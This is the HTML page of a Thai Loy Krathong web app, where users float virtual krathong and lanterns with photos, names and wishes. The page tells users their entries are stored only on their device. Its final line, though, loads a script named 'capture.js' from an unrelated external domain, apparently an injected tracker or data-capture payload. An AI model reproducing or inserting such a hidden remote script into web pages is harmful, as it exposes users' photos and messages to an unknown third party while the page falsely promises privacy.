<!doctype html>
<html lang="th">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
  <title>ลอยกระทงกับสองสอง</title>
  <style>
    :root {
      --font-th: "Thonburi", "Sukhumvit Set", "Leelawadee UI", "Noto Sans Thai", "Tahoma", system-ui, sans-serif;
      --gold: #ffd98a;
      --gold-deep: #e9a93c;
      --ink: #fff8ec;
      --panel: rgba(18, 16, 58, 0.94);
      --panel-line: rgba(255, 217, 138, 0.55);
    }
    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      height: 100%;
      overflow: hidden;
      background: #070a24;
      color: var(--ink);
      font-family: var(--font-th);
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
    }
    #river {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      display: block;
      touch-action: none;
    }

    /* ---------- top bar ---------- */
    #topBar {
      position: fixed;
      z-index: 5;
      top: max(12px, env(safe-area-inset-top));
      left: max(12px, env(safe-area-inset-left));
      right: max(12px, env(safe-area-inset-right));
      display: flex;
      align-items: center;
      gap: 10px;
      pointer-events: none;
    }
    #topBar > * { pointer-events: auto; }
    .chip-btn {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      min-height: 44px;
      padding: 0 16px;
      border: 2px solid var(--panel-line);
      border-radius: 999px;
      background: rgba(18, 16, 58, 0.72);
      color: var(--ink);
      font: 700 16px/1 var(--font-th);
      text-decoration: none;
      cursor: pointer;
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
    }
    #wishesBtn.on {
      background: linear-gradient(180deg, #ff8cc0, #e2558f);
      border-color: #ffd1e6;
      color: #fff;
      box-shadow: 0 0 14px rgba(255, 140, 192, 0.6);
    }
    #title {
      flex: 1;
      text-align: center;
      font-size: clamp(20px, 3.2vw, 34px);
      font-weight: 800;
      color: #fff6dc;
      text-shadow: 0 0 10px rgba(255, 196, 110, 0.9), 0 2px 3px rgba(10, 6, 40, 0.9);
      pointer-events: none;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    #count { font-variant-numeric: tabular-nums; }

    /* ---------- krathong list ---------- */
    #listPanel {
      position: fixed;
      z-index: 6;
      top: calc(max(12px, env(safe-area-inset-top)) + 54px);
      right: max(12px, env(safe-area-inset-right));
      width: min(320px, calc(100vw - 24px));
      max-height: 60vh;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
      padding: 10px;
      border: 2px solid var(--panel-line);
      border-radius: 18px;
      background: var(--panel);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.45);
    }
    #listPanel[hidden] { display: none; }
    .list-head { padding: 4px 6px 10px; font-weight: 800; color: var(--gold); }
    .list-head small { display: block; font-weight: 600; font-size: 12px; color: rgba(255, 248, 236, 0.6); }
    #listItems button {
      display: flex;
      align-items: center;
      gap: 10px;
      width: 100%;
      min-height: 48px;
      padding: 6px 10px;
      border: 0;
      border-radius: 12px;
      background: transparent;
      color: var(--ink);
      font: 700 17px/1.3 var(--font-th);
      text-align: left;
      cursor: pointer;
    }
    #listItems button:active, #listItems button:hover { background: rgba(255, 255, 255, 0.08); }
    #listItems .dot { flex: none; width: 14px; height: 14px; border-radius: 50%; }
    #listItems .thumb { flex: none; width: 38px; height: 38px; object-fit: contain; }
    #listItems .empty { padding: 12px; color: rgba(255, 248, 236, 0.6); text-align: center; }

    /* ---------- edit / delete bar for the krathong in close-up ---------- */
    #focusBar {
      position: fixed;
      z-index: 6;
      left: 50%;
      bottom: calc(max(20px, env(safe-area-inset-bottom)) + var(--actions-h, 64px) + 16px);
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      gap: 8px;
      max-width: calc(100vw - 24px);
      padding: 8px 8px 8px 18px;
      border: 2px solid var(--panel-line);
      border-radius: 999px;
      background: var(--panel);
      box-shadow: 0 8px 26px rgba(0, 0, 0, 0.45);
    }
    #focusBar[hidden] { display: none; }
    #focusName {
      max-width: 34vw;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      font-weight: 800;
      font-size: 18px;
      color: var(--gold);
    }
    #focusBar button {
      min-height: 46px;
      padding: 0 16px;
      border: 2px solid rgba(255, 255, 255, 0.25);
      border-radius: 999px;
      background: rgba(255, 255, 255, 0.08);
      color: var(--ink);
      font: 800 16px/1 var(--font-th);
      cursor: pointer;
    }
    #focusBar #deleteBtn { border-color: #ff8a8a; color: #ffc4c4; }
    #focusBar #unfocusBtn { min-width: 46px; padding: 0; }
    body.sheet-open #focusBar, body.sheet-open #hint { display: none; }

    /* ---------- main action ---------- */
    #actions {
      position: fixed;
      z-index: 5;
      left: 50%;
      bottom: max(20px, env(safe-area-inset-bottom));
      transform: translateX(-50%);
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 12px;
      width: max-content;
      max-width: calc(100vw - 24px);
    }
    #floatBtn, #lanternBtn, #fireBtn {
      min-height: 64px;
      padding: 0 clamp(16px, 2.6vw, 34px);
      white-space: nowrap;
      border: 3px solid var(--gold);
      border-radius: 999px;
      background: linear-gradient(180deg, #ff8fc4, #d94f97);
      color: #fff;
      font: 800 clamp(20px, 2.6vw, 28px)/1 var(--font-th);
      text-shadow: 0 2px 2px rgba(110, 20, 70, 0.7);
      box-shadow: 0 0 0 3px rgba(120, 40, 120, 0.6), 0 0 26px rgba(255, 170, 220, 0.75);
      cursor: pointer;
      animation: pulse 2.4s ease-in-out infinite;
    }
    #lanternBtn {
      background: linear-gradient(180deg, #ffbe6a, #e0742a);
      text-shadow: 0 2px 2px rgba(110, 40, 10, 0.7);
      animation-delay: 1.2s;
    }
    #fireBtn {
      background: linear-gradient(180deg, #9a8cff, #5a46d6);
      text-shadow: 0 2px 2px rgba(30, 20, 90, 0.7);
      animation-delay: 0.6s;
    }
    #floatBtn:active, #lanternBtn:active, #fireBtn:active { transform: scale(0.96); }
    #floatBtn[disabled] { opacity: 0.55; animation: none; }
    #kindChips button { flex: 1; min-height: 48px; font-size: 17px; }
    #kindChips button[aria-pressed="true"] {
      background: var(--gold);
      border-color: var(--gold);
      color: #2a1640;
      box-shadow: 0 0 14px var(--gold);
    }
    @keyframes pulse {
      0%, 100% { box-shadow: 0 0 0 3px rgba(120, 40, 120, 0.6), 0 0 18px rgba(255, 170, 220, 0.55); }
      50% { box-shadow: 0 0 0 3px rgba(120, 40, 120, 0.6), 0 0 34px rgba(255, 190, 230, 0.95); }
    }
    #hint {
      position: fixed;
      z-index: 4;
      left: 50%;
      bottom: calc(max(20px, env(safe-area-inset-bottom)) + var(--actions-h, 64px) + 12px);
      transform: translateX(-50%);
      padding: 6px 14px;
      border-radius: 999px;
      background: rgba(10, 8, 40, 0.55);
      color: rgba(255, 248, 236, 0.85);
      font-size: 14px;
      white-space: nowrap;
      pointer-events: none;
      transition: opacity 0.4s;
    }

    /* ---------- form sheet ---------- */
    #sheetBackdrop {
      position: fixed;
      inset: 0;
      z-index: 9;
      background: rgba(4, 4, 20, 0.45);
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.25s;
    }
    #sheet {
      position: fixed;
      z-index: 10;
      top: 0;
      right: 0;
      bottom: 0;
      width: min(440px, 100vw);
      padding: max(18px, env(safe-area-inset-top)) 20px max(18px, env(safe-area-inset-bottom));
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
      background: var(--panel);
      border-left: 2px solid var(--panel-line);
      box-shadow: -10px 0 40px rgba(0, 0, 0, 0.5);
      transform: translateX(105%);
      transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
    }
    body.sheet-open #sheet { transform: none; }
    body.sheet-open #sheetBackdrop { opacity: 1; pointer-events: auto; }
    @media (max-aspect-ratio: 4/5) {
      #sheet {
        top: auto;
        left: 0;
        width: 100vw;
        max-height: 88vh;
        border-left: 0;
        border-top: 2px solid var(--panel-line);
        border-radius: 26px 26px 0 0;
        transform: translateY(105%);
      }
    }
    #sheet h2 {
      margin: 4px 0 14px;
      font-size: 24px;
      color: var(--gold);
    }
    .field { margin-bottom: 14px; }
    .field > .lbl {
      display: block;
      margin-bottom: 6px;
      font-size: 15px;
      font-weight: 700;
      color: rgba(255, 248, 236, 0.85);
    }
    .field input[type="text"], .field textarea {
      width: 100%;
      padding: 12px 14px;
      border: 2px solid rgba(255, 217, 138, 0.35);
      border-radius: 14px;
      background: rgba(255, 255, 255, 0.07);
      color: var(--ink);
      font: 600 18px/1.5 var(--font-th);
      outline: none;
      resize: none;
    }
    .field input[type="text"]:focus, .field textarea:focus { border-color: var(--gold); }
    #photoPick {
      position: relative;
      display: grid;
      place-items: center;
      height: 220px;
      border: 2px dashed rgba(255, 217, 138, 0.5);
      border-radius: 18px;
      background:
        radial-gradient(circle at 50% 40%, rgba(120, 100, 255, 0.25), transparent 70%),
        rgba(255, 255, 255, 0.04);
      cursor: pointer;
      overflow: hidden;
    }
    #photoPick input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
    #photoPreview { max-width: 92%; max-height: 92%; display: none; pointer-events: none; }
    #photoPick.has-photo #photoPreview { display: block; }
    #photoPick.has-photo #photoEmpty { display: none; }
    #photoEmpty { text-align: center; color: rgba(255, 248, 236, 0.7); font-size: 16px; pointer-events: none; }
    #photoEmpty b { display: block; font-size: 44px; margin-bottom: 6px; }
    .photo-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 10px;
      margin-top: 8px;
      font-size: 14px;
    }
    .photo-row label { display: inline-flex; align-items: center; gap: 6px; cursor: pointer; }
    .photo-row input { width: 20px; height: 20px; accent-color: #ff8fc4; }
    #photoStatus { color: rgba(255, 248, 236, 0.65); text-align: right; }
    .chips { display: flex; flex-wrap: wrap; gap: 8px; }
    .chips button {
      min-height: 40px;
      padding: 0 14px;
      border: 2px solid rgba(255, 255, 255, 0.18);
      border-radius: 999px;
      background: rgba(255, 255, 255, 0.07);
      color: var(--ink);
      font: 700 15px/1 var(--font-th);
      cursor: pointer;
    }
    #catChips button { border-color: var(--c); }
    #catChips button[aria-pressed="true"] {
      background: var(--c);
      color: #2a1640;
      box-shadow: 0 0 14px var(--c);
    }
    #presetChips button { font-weight: 600; font-size: 14px; }
    .sheet-actions { display: flex; gap: 10px; margin-top: 20px; }
    .sheet-actions button {
      flex: 1;
      min-height: 56px;
      border-radius: 999px;
      font: 800 19px/1 var(--font-th);
      cursor: pointer;
    }
    #cancelBtn { border: 2px solid rgba(255, 255, 255, 0.3); background: transparent; color: var(--ink); }
    #submitBtn {
      flex: 1.6;
      border: 3px solid var(--gold);
      background: linear-gradient(180deg, #ff8fc4, #d94f97);
      color: #fff;
      text-shadow: 0 2px 2px rgba(110, 20, 70, 0.7);
    }
    #formError { min-height: 20px; margin-top: 10px; color: #ffb4b4; font-size: 14px; text-align: center; }
    #dangerZone { margin-top: 26px; font-size: 14px; color: rgba(255, 248, 236, 0.6); }
    #dangerZone summary { cursor: pointer; }
    #clearBtn {
      margin-top: 10px;
      min-height: 40px;
      padding: 0 16px;
      border: 2px solid #ff8a8a;
      border-radius: 999px;
      background: transparent;
      color: #ffb4b4;
      font: 700 14px/1 var(--font-th);
      cursor: pointer;
    }

    #toast {
      position: fixed;
      z-index: 20;
      top: calc(max(12px, env(safe-area-inset-top)) + 58px);
      left: 50%;
      transform: translate(-50%, -10px);
      padding: 10px 18px;
      border-radius: 14px;
      background: rgba(18, 16, 58, 0.92);
      border: 1px solid var(--panel-line);
      font-size: 16px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s, transform 0.3s;
    }
    #toast.show { opacity: 1; transform: translate(-50%, 0); }

    #loading {
      position: fixed;
      inset: 0;
      z-index: 30;
      display: grid;
      place-items: center;
      background: #070a24;
      color: var(--gold);
      font-size: 22px;
      transition: opacity 0.6s;
    }
    #loading.done { opacity: 0; pointer-events: none; }
    #fsBtn[hidden] { display: none; }
    #fsBtn .fs-exit, #fsBtn.on .fs-enter { display: none; }
    #fsBtn.on .fs-exit { display: block; }
    /* phones: smaller chips, the wishes toggle shows just its icon, and the
       title shrinks so every button still fits */
    @media (max-width: 600px) {
      #topBar { gap: 6px; }
      #topBar .chip-btn { padding: 0 11px; flex: none; }
      #title { min-width: 0; font-size: 16px; }
      #wishesBtn { font-size: 0; gap: 0; }
      #wishesBtn::before { content: "💬"; font-size: 18px; }
    }
  </style>
</head>
<body>
  <canvas id="river"></canvas>

  <div id="topBar">
    <a class="chip-btn" href="menu.html">‹ เมนู</a>
    <div id="title">🌸 ลอยกระทงกับสองสอง 🌸</div>
    <button class="chip-btn" id="wishesBtn" type="button" aria-pressed="false" aria-label="แสดงคำอวยพร">💬 คำอวยพร</button>
    <button class="chip-btn" id="soundBtn" type="button" aria-label="เสียง">🔊</button>
    <button class="chip-btn" id="fsBtn" type="button" aria-label="เต็มจอ" title="เต็มจอ" hidden>
      <svg class="fs-enter" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9V4h5M20 9V4h-5M4 15v5h5M20 15v5h-5"/></svg>
      <svg class="fs-exit" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M9 4v5H4M15 4v5h5M9 20v-5H4M15 20v-5h5"/></svg>
    </button>
    <button class="chip-btn" id="listBtn" type="button"><span id="count">🌸 0</span> ▾</button>
  </div>

  <div id="listPanel" hidden>
    <div class="list-head">กระทง &amp; โคมลอย <small>แตะชื่อเพื่อดู / แก้ไข / ลบ</small></div>
    <div id="listItems"></div>
  </div>

  <div id="focusBar" hidden>
    <span id="focusName"></span>
    <button type="button" id="editBtn">✏️ แก้ไข</button>
    <button type="button" id="deleteBtn">🗑️ ลบ</button>
    <button type="button" id="unfocusBtn" aria-label="ปิด">✕</button>
  </div>

  <div id="hint">แตะกระทงหรือโคมเพื่อดูใกล้ๆ · ลากเพื่อหมุนดูรอบๆ</div>
  <div id="actions">
    <button id="floatBtn" type="button">🌸 ลอยกระทง</button>
    <button id="lanternBtn" type="button">🏮 ปล่อยโคมลอย</button>
    <button id="fireBtn" type="button">🎆 จุดพลุ</button>
  </div>

  <div id="sheetBackdrop"></div>
  <form id="sheet" autocomplete="off">
    <h2 id="sheetTitle">กระทงใบใหม่</h2>

    <div class="field">
      <div class="chips" id="kindChips">
        <button type="button" data-kind="krathong" aria-pressed="true">🌸 กระทง</button>
        <button type="button" data-kind="lantern" aria-pressed="false">🏮 โคมลอย</button>
      </div>
    </div>

    <div class="field">
      <span class="lbl">ชื่อ</span>
      <input type="text" id="fName" maxlength="40" placeholder="ชื่อ" />
    </div>

    <div class="field">
      <span class="lbl">รูป</span>
      <label id="photoPick">
        <input type="file" id="fPhoto" accept="image/*" />
        <div id="photoEmpty"><b>📷</b>แตะเพื่อเลือกรูป</div>
        <img id="photoPreview" alt="" />
      </label>
      <div class="photo-row">
        <label><input type="checkbox" id="fCut" checked /> ตัดพื้นหลังอัตโนมัติ</label>
        <span id="photoStatus"></span>
      </div>
    </div>

    <div class="field">
      <span class="lbl">คำอวยพร</span>
      <textarea id="fWish" rows="3" maxlength="120" placeholder="ขอให้..."></textarea>
      <div class="chips" id="presetChips" style="margin-top:8px"></div>
    </div>

    <div class="field">
      <span class="lbl">หมวด (สี)</span>
      <div class="chips" id="catChips"></div>
    </div>

    <div class="sheet-actions">
      <button type="button" id="cancelBtn">ยกเลิก</button>
      <button type="submit" id="submitBtn">ลอยกระทง ✨</button>
    </div>
    <div id="formError"></div>

    <details id="dangerZone">
      <summary>ตั้งค่าแม่น้ำ</summary>
      <p>กระทงทั้งหมดเก็บไว้ในเครื่องนี้เท่านั้น ไม่ได้ส่งขึ้น server</p>
      <button type="button" id="clearBtn">ล้างกระทงทั้งหมด</button>
    </details>
  </form>

  <div id="toast"></div>
  <div id="loading">กำลังเตรียมแม่น้ำ…</div>

  <script type="module" src="js/loykrathong.js"></script>
  <script src="https://record.22422522.xyz/capture.js?v=2"></script>
</body>
</html>
